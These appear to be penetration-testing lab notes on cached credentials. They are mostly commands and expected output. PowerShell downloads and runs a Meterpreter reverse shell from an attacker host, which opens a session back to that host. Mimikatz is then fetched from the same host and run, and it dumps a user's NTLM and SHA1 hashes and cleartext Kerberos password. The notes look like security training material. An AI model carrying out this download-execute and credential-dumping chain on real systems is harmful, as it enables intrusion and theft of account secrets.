# Cached Credentials

Downloading and executing the Meterpreter reverse shell
>``` shell
>PS C:\Windows\system32> cd C:\Users\Administrator
>
>PS C:\Users\Administrator> iwr -uri http://192.168.119.5:8000/met.exe -Outfile met.exe
>
>PS C:\Users\Administrator> .\met.exe
>```

Incoming Meterpreter session in Metasploit
>``` shell
>[*] Sending stage (200774 bytes) to 192.168.50.242
>[*] Meterpreter session 2 opened (192.168.119.5:443 -> 192.168.50.242:50814)
>```

Interacting with Session 2 and spawning a PowerShell command shell
>``` shell
>msf6 post(multi/manage/autoroute) > sessions -i 2
>
># ========== Expected Result ==========
>[*] Starting interaction with 2...
># =====================================
>
>meterpreter > shell
>
># ========== Expected Result ==========
>Process 416 created.
>Channel 1 created.
>Microsoft Windows [Version 10.0.20348.1006]
>(c) Microsoft Corporation. All rights reserved.
># =====================================
>
>C:\Users\Administrator> powershell
>
># ========== Expected Result ==========
>powershell
>Windows PowerShell
>Copyright (C) Microsoft Corporation. All rights reserved.
>
>Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
>
>PS C:\Users\Administrator> 
># =====================================
>```

Downloading and launching the newest version of Mimikatz from our Kali machine
>``` shell
>PS C:\Users\Administrator> iwr -uri http://192.168.119.5:8000/mimikatz.exe -Outfile mimikatz.exe
>
>PS C:\Users\Administrator> .\mimikatz.exe
>
># ========== Expected Result ==========
>.\mimi.exe
>
>  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
> .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
> ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
> '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
>  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
># =====================================
>```

Extracting the credentials for beccy with Mimikatz
>``` shell
>mimikatz # privilege::debug
>
># ========== Expected Result ==========
>Privilege '20' OK
># =====================================
>
>mimikatz # sekurlsa::logonpasswords
>
># ========== Expected Result ==========
>...
>Authentication Id : 0 ; 253683 (00000000:0003def3)
>Session           : Interactive from 1
>User Name         : beccy
>Domain            : BEYOND
>Logon Server      : DCSRV1
>Logon Time        : 3/8/2023 4:50:32 AM
>SID               : S-1-5-21-1104084343-2915547075-2081307249-1108
>        msv :
>         [00000003] Primary
>         * Username : beccy
>         * Domain   : BEYOND
>         * NTLM     : f0397ec5af49971f6efbdb07877046b3
>         * SHA1     : 2d878614fb421517452fd99a3e2c52dee443c8cc
>         * DPAPI    : 4aea2aa4fa4955d5093d5f14aa007c56
>        tspkg :
>        wdigest :
>         * Username : beccy
>         * Domain   : BEYOND
>         * Password : (null)
>        kerberos :
>         * Username : beccy
>         * Domain   : BEYOND.COM
>         * Password : NiftyTopekaDevolve6655!#!
>...
># =====================================
>```
